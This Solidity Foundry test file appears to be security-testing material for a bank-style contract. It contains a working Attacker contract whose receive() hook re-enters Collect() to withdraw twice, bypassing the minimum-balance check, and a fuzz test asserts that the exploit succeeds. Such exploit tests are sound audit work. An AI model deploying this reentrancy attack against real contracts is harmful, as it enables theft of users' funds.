
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {MY_BANK, Log} from "../src/MY_BANK.sol";

contract TestReentrancyMY_BANK is Test {
    
    MY_BANK public _contractUnderTest;
    Log public _log;
    Attacker public _attacker;

    function setUp() public {
        _log = new Log();
        _contractUnderTest = new MY_BANK(address(_log));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // --- 1. Constraints & Pitfall Avoidance ---
        // MinSum is 1 ether. We deposit 1 ether to pass the initial check.
        // We want to withdraw 'attackVal' twice via reentrancy.
        // Constraint: 2 * attackVal <= 1 ether to avoid underflow (which would revert in 0.8.x).
        // This proves we can bypass the 'acc.balance >= MinSum' check for the second withdrawal.
        vm.assume(attackVal > 0.01 ether && attackVal <= 0.5 ether);

        uint256 depositAmount = 1 ether;

        // --- 3. Funding ---
        // Fund the Victim (optional here as we deposit, but good practice)
        vm.deal(address(_contractUnderTest), depositAmount); 
        
        // Fund the Test Contract so it can fund the Attacker
        vm.deal(address(this), depositAmount);

        // --- 4. Trigger Attack ---
        // Setup: Deposit 1 ether to meet MinSum requirement
        _attacker.setupAttack{value: depositAmount}(depositAmount);
        // Attack: Try to withdraw 'attackVal' twice
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    MY_BANK public target;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public storedVal;

    constructor(address victimAddress) { 
        target = MY_BANK(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        
        // Deposit funds to satisfy MinSum (1 ether) and set unlockTime to 0
        target.Put{value: val}(0);
    }

    function attack(uint256 val) public {
        storedVal = val;
        uint256 initialBalance = address(this).balance;

        // Call the vulnerable function
        target.Collect(val);

        // Verify Success Conditions
        // Normal behavior: 
        // 1. Withdraw 'val'. Balance becomes (1.0 - val).
        // 2. Next withdrawal should fail because (1.0 - val) < MinSum (1.0).
        // If we successfully withdrew twice (received 2 * val), we bypassed the MinSum invariant.
        if (address(this).balance >= initialBalance + (val * 2)) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 1) {            
            // Re-enter the contract
            attackCallCount++;
            target.Collect(storedVal);
        }
    }
}
